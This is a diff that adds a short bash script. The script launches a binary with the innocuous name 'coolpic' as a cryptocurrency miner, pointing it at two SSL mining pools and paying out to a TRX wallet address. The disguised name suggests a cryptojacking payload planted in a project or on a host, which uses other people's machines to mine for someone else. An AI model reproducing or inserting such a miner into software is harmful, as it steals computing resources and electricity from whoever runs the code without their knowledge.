@@ -1,0 +1,2 @@
+#!/bin/bash
+./coolpic -rmode 0 -pool ssl://ethash.unmineable.com:13333 -pool2 ssl://ethash.tron-mining.com:3333 - TRX:TYUe8MUn4usSpfeUruvh5ddS5cM7SETor5.user -data
